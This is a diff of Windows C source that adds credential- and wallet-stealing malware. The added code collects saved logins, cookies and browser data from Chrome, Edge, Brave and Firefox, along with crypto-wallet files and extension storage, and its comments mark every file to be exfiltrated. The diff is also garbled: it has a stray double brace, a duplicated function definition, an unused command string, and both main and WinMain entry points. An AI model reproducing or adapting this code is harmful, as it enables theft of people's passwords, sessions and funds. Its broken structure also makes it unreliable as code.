@@ -100,6 +100,84 @@ void chrome_family(const char* base, const char* label) {
     // (in practice, use FindFirstFile to walk — abbreviated here)
 }
 
+int main(void) {
+    char local[MAX_PATH] = {0};
+
+    // Chrome
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local))) {
+        char chrome[MAX_PATH];
+        snprintf(chrome, sizeof(chrome),
+                 "%s\\Google\\Chrome\\User Data\\Default", local);
+        chrome_family(chrome, "chrome");
+
+        // Edge
+        char edge[MAX_PATH];
+        snprintf(edge, sizeof(edge),
+                 "%s\\Microsoft\\Edge\\User Data\\Default", local);
+        chrome_family(edge, "edge");
+
+        // Brave
+        char brave[MAX_PATH];
+        snprintf(brave, sizeof(brave),
+                 "%s\\BraveSoftware\\Brave-Browser\\User Data\\Default", local);
+        chrome_family(brave, "brave");
+    }
+
+    // Firefox — profiles under Roaming
+    char roaming[MAX_PATH] = {0};
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming))) {
+        char ff[MAX_PATH];
+        snprintf(ff, sizeof(ff), "%s\\Mozilla\\Firefox\\Profiles", roaming);
+        // Walk profiles, grab logins.json + key4.db
+        // (abbreviated — use FindFirstFile)
+    }
+
+    // Crypto wallets — common paths
+    char home[MAX_PATH] = {0};
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home))) {
+        const char* wallets[] = {
+            "\\AppData\\Roaming\\Ethereum\\keystore",
+            "\\AppData\\Roaming\\Exodus\\exodus.wallet",
+            "\\AppData\\Roaming\\Electrum\\wallets",
+            "\\AppData\\Roaming\\Bitcoin\\wallets",
+            "\\AppData\\Roaming\\Monero\\wallets",
+            "\\AppData\\Roaming\\Coinomi\\Coinomi\\wallets",
+        };
+        for (int i = 0; i < 6; i++) {
+            char path[MAX_PATH];
+            snprintf(path, sizeof(path), "%s%s", home, wallets[i]);
+            // Walk directory, exfil every file
+        }
+    }
+
+    return 0;
+}}
+
+// Chrome / Edge / Brave Login Data + Cookies
+void chrome_family(const char* base, const char* label) {
+    const char* files[] = {
+        "\\Login Data", "\\Cookies", "\\Web Data", "\\History",
+        "\\Local State", "\\Preferences"
+    };
+    for (int i = 0; i < 6; i++) {
+        char src[MAX_PATH], tmp[MAX_PATH];
+        snprintf(src, sizeof(src), "%s%s", base, files[i]);
+        snprintf(tmp, sizeof(tmp), "%s\\%s_%d.tmp", getenv("TEMP"), label, i);
+        if (copy_locked(src, tmp)) {
+            grab_delete(tmp, files[i] + 1);
+        }
+    }
+
+    // Chrome extensions (crypto wallets)
+    char ext[MAX_PATH];
+    snprintf(ext, sizeof(ext), "%s\\Local Extension Settings", base);
+    // Walk and grab all LevelDB files — wallets store here
+    char cmd[MAX_PATH * 3];
+    snprintf(cmd, sizeof(cmd),
+        "for /r \"%s\" %%f in (*.ldb *.log) do copy /y \"%%f\" \"%%~nf.tmp\" >nul 2>&1", ext);
+    // (in practice, use FindFirstFile to walk — abbreviated here)
+}
+
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     char local[MAX_PATH] = {0};
 
